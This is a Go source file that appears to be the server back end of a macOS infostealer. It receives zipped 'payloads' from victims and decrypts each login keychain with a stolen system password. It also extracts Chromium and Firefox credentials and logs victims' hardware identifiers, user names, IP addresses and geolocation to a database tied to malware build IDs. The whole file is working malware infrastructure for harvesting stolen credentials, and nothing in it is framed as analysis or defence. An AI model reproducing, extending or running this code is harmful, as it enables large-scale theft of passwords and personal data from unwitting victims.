package handlers

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"paradox_server/decode"
	"paradox_server/extract"
	"paradox_server/fileops"
	"paradox_server/models"
	"path/filepath"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
)

const baseLogDir = "./log-directory"

func HandleUpload(c *gin.Context, db *sql.DB) {
	file, err := c.FormFile("payload")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Failed to get file from form: " + err.Error()})
		return
	}

	if err := os.MkdirAll(baseLogDir, 0755); err != nil {
		log.Printf("Error creating base log directory %s: %v", baseLogDir, err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create base log directory: " + err.Error()})
		return
	}

	tempDir, err := os.MkdirTemp(baseLogDir, "upload-*")
	if err != nil {
		log.Printf("Error creating temp directory in %s: %v", baseLogDir, err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create temp directory: " + err.Error()})
		return
	}

	zipPath := filepath.Join(tempDir, file.Filename)
	if err := c.SaveUploadedFile(file, zipPath); err != nil {
		log.Printf("Error saving uploaded file to %s: %v", zipPath, err)
		os.RemoveAll(tempDir)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to save uploaded file: " + err.Error()})
		return
	}

	fmt.Printf("Received file: %s, saved to: %s. Starting background processing.\n", file.Filename, zipPath)

	uploadUUID := uuid.New().String()

	c.JSON(http.StatusAccepted, gin.H{
		"message":  "Payload received successfully. Processing started in background.",
		"tempPath": tempDir,
	})

	go processPayloadAsync(zipPath, tempDir, uploadUUID, db)
}

func processPayloadAsync(zipPath, tempDir, uploadUUID string, db *sql.DB) {
	log.Printf("Background processing started for: %s in %s (UploadUUID: %s)\n", zipPath, tempDir, uploadUUID)

	zipFileName := filepath.Base(zipPath)

	extractDir := filepath.Join(tempDir, "extracted")
	if err := fileops.Unzip(zipPath, extractDir); err != nil {
		log.Printf("Error unzipping file %s to %s: %v\n", zipPath, extractDir, err)
		return
	}
	log.Printf("Unzipped content to: %s\n", extractDir)

	filenameStorePath := filepath.Join(extractDir, "original_filename.txt")
	if err := os.WriteFile(filenameStorePath, []byte(zipFileName), 0644); err != nil {
		log.Printf("Warning: Failed to save original filename: %v\n", err)
	}

	if err := os.Remove(zipPath); err != nil {
		log.Printf("Warning: Failed to remove original zip file %s: %v\n", zipPath, err)

	} else {
		log.Printf("Deleted original zip file %s to save space\n", zipPath)
	}

	keychainDbName := "login.keychain-db"
	systemInfoName := "system_info.json"

	systemInfoPath, err := fileops.FindFile(extractDir, systemInfoName)
	if err != nil {
		log.Printf("Error finding system info file '%s' in %s: %v\n", systemInfoName, extractDir, err)
		return
	}
	log.Printf("Found system info: %s\n", systemInfoPath)

	systemInfoData, err := os.ReadFile(systemInfoPath)
	if err != nil {
		log.Printf("Error reading system_info.json %s: %v\n", systemInfoPath, err)
		return
	}

	var sysInfo models.SystemInfo
	if err := json.Unmarshal(systemInfoData, &sysInfo); err != nil {
		log.Printf("Error parsing system_info.json %s: %v\n", systemInfoPath, err)
		return
	}

	if sysInfo.BUILDID == "" {
		log.Printf("Error: BUILD_ID not found or empty in %s\n", systemInfoPath)
		return
	}

	_, err = GetFilenameByBuildID(db, sysInfo.BUILDID)
	if err != nil {
		log.Printf("Invalid build ID '%s': %v\n", sysInfo.BUILDID, err)
		return
	}

	if err := AddLogLocationToDB(db, sysInfo.BUILDID, uploadUUID, tempDir); err != nil {
		log.Printf("Error adding log location to DB (BuildID: %s, UploadUUID: %s): %v\n", sysInfo.BUILDID, uploadUUID, err)
	}

	keychainPath, err := fileops.FindFile(extractDir, keychainDbName)
	if err != nil {
		log.Printf("Error finding keychain file '%s' in %s: %v\n", keychainDbName, extractDir, err)
		return
	}
	log.Printf("Found keychain: %s\n", keychainPath)

	if sysInfo.SystemPassword == "" {
		log.Printf("Error: 'system_password' not found or empty in %s\n", systemInfoPath)
		return
	}
	log.Println("Extracted system password.")

	var keychain models.DecryptedKeychain
	keychain, err = decode.DecodeKeychain(keychainPath, sysInfo.SystemPassword)
	if err != nil {
		log.Printf("Error decoding keychain file %s: %v\n", keychainPath, err)
		return
	}
	log.Printf("Decoded keychain: %d password hashes, %d generic passwords, %d internet passwords\n",
		len(keychain.KeychainPasswordHash),
		len(keychain.GenericPasswords),
		len(keychain.InternetPasswords),
	)

	virtualZipPath := filepath.Join(tempDir, zipFileName)

	log.Println("Starting Chromium data extraction...")
	extractionResults, err := extract.ExtractChrome(keychain, sysInfo, extractDir, virtualZipPath)
	if err != nil {

		log.Printf("Error extracting chromium data: %v. Continuing with Gecko extraction...\n", err)

		if extractionResults.Browsers == nil {
			extractionResults = models.ExtractionResults{
				SystemInfo: sysInfo,
				Browsers:   make(map[string]models.BrowserData),
				Timestamp:  time.Now().UTC(),
			}
		}
	} else {
		log.Printf("Chromium extraction successful. Found data for %d browsers.\n", len(extractionResults.Browsers))
	}

	log.Println("Starting Gecko (Firefox) data extraction...")
	geckoResults, err := extract.ExtractGecko(sysInfo, extractDir, virtualZipPath)
	if err != nil {
		log.Printf("Error extracting gecko data: %v\n", err)

	} else {
		log.Printf("Gecko extraction successful. Found data for %d profiles.\n", len(geckoResults))

		if extractionResults.Browsers == nil {
			extractionResults.Browsers = make(map[string]models.BrowserData)
		}
		for browserKey, browserData := range geckoResults {
			if _, exists := extractionResults.Browsers[browserKey]; exists {
				log.Printf("Warning: Duplicate browser key found during merge: %s. Overwriting with Gecko data.", browserKey)
			}
			extractionResults.Browsers[browserKey] = browserData
		}
	}

	log.Println("Combining and saving all extracted data...")

	extractionResults.Timestamp = time.Now().UTC()

	if len(extractionResults.Browsers) == 0 {
		log.Printf("No browser data (Chromium or Gecko) could be extracted for payload %s.\n", zipFileName)
		if err := AddSystemInfoToDB(db, sysInfo); err != nil {
			log.Printf("Error adding system info to DB even though no browser data found: %v\n", err)
		}

		log.Printf("Background processing finished for: %s (UploadUUID: %s) - No browser data extracted.\n", zipPath, uploadUUID)
		return
	}

	jsonResults, err := json.MarshalIndent(extractionResults, "", "  ")
	if err != nil {
		log.Printf("Error marshalling extraction results: %v\n", err)
		return
	}

	if err := AddSystemInfoToDB(db, sysInfo); err != nil {
		log.Printf("Error adding system info to DB: %v\n", err)

	}

	resultsPath := filepath.Join(tempDir, "extracted", "results.json")
	if err := os.WriteFile(resultsPath, jsonResults, 0644); err != nil {
		log.Printf("Error writing results to %s: %v\n", resultsPath, err)
		return
	}

	log.Printf("Background processing finished for: %s (UploadUUID: %s)\n", zipPath, uploadUUID)
}

func AddSystemInfoToDB(db *sql.DB, sysInfo models.SystemInfo) error {
	insertSQL := `INSERT INTO system_info_logs (
		build_id, activation_lock_status, boot_mode, boot_volume, chip, computer_name, 
		hardware_uuid, kernel_version, memory, model_identifier, model_name, model_number, 
		os_loader_version, provisioning_udid, secure_virtual_memory, serial_number_system, 
		system_firmware_version, system_integrity_protection, system_version, 
		time_since_boot, total_number_of_cores, user_name, system_os, 
		ip_city_name, ip_continent, ip_continent_code, ip_country_code, ip_country_name, 
		ip_currency_code, ip_currency_name, ip_address, ip_version, ip_is_proxy, 
		ip_language, ip_latitude, ip_longitude, ip_region_name, ip_time_zone, 
		ip_time_zones, ip_tlds, ip_zip_code, timestamp
	) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)`

	_, err := db.Exec(insertSQL,
		sysInfo.BUILDID,
		sysInfo.ActivationLockStatus,
		sysInfo.BootMode,
		sysInfo.BootVolume,
		sysInfo.Chip,
		sysInfo.ComputerName,
		sysInfo.HardwareUUID,
		sysInfo.KernelVersion,
		sysInfo.Memory,
		sysInfo.ModelIdentifier,
		sysInfo.ModelName,
		sysInfo.ModelNumber,
		sysInfo.OSLoaderVersion,
		sysInfo.ProvisioningUDID,
		sysInfo.SecureVirtualMemory,
		sysInfo.SerialNumberSystem,
		sysInfo.SystemFirmwareVersion,
		sysInfo.SystemIntegrityProtection,
		sysInfo.SystemVersion,
		sysInfo.TimeSinceBoot,
		sysInfo.TotalNumberOfCores,
		sysInfo.UserName,
		sysInfo.SystemOs,
		sysInfo.IPInfo.CityName,
		sysInfo.IPInfo.Continent,
		sysInfo.IPInfo.ContinentCode,
		sysInfo.IPInfo.CountryCode,
		sysInfo.IPInfo.CountryName,
		sysInfo.IPInfo.Currency.Code,
		sysInfo.IPInfo.Currency.Name,
		sysInfo.IPInfo.IPAddress,
		sysInfo.IPInfo.IPVersion,
		sysInfo.IPInfo.IsProxy,
		sysInfo.IPInfo.Language,
		sysInfo.IPInfo.Latitude,
		sysInfo.IPInfo.Longitude,
		sysInfo.IPInfo.RegionName,
		sysInfo.IPInfo.TimeZone,
		strings.Join(sysInfo.IPInfo.TimeZones, ","),
		strings.Join(sysInfo.IPInfo.Tlds, ","),
		sysInfo.IPInfo.ZipCode,
	)

	if err != nil {
		return fmt.Errorf("failed to insert system info for build ID %s: %w", sysInfo.BUILDID, err)
	}

	log.Printf("Successfully added system info for build ID %s to database.", sysInfo.BUILDID)
	return nil
}

func AddLogLocationToDB(db *sql.DB, buildID, uploadUUID, logDir string) error {

	relativePath, err := filepath.Rel(baseLogDir, logDir)
	if err != nil {

		log.Printf("Warning: Could not get relative path for log directory %s (base: %s). Storing absolute path. Error: %v", logDir, baseLogDir, err)
		relativePath = logDir
	}

	insertSQL := `INSERT INTO log_locations (build_id, upload_uuid, relative_log_path) VALUES (?, ?, ?)`
	_, err = db.Exec(insertSQL, buildID, uploadUUID, relativePath)
	if err != nil {
		return fmt.Errorf("failed to insert log location (BuildID: %s, UploadUUID: %s, Path: %s): %w", buildID, uploadUUID, relativePath, err)
	}

	log.Printf("Stored log location: BuildID=%s, UploadUUID=%s, Path=%s\n", buildID, uploadUUID, relativePath)
	return nil
}

func AddLogToDB(db *sql.DB, logData string) error {

	return nil
}
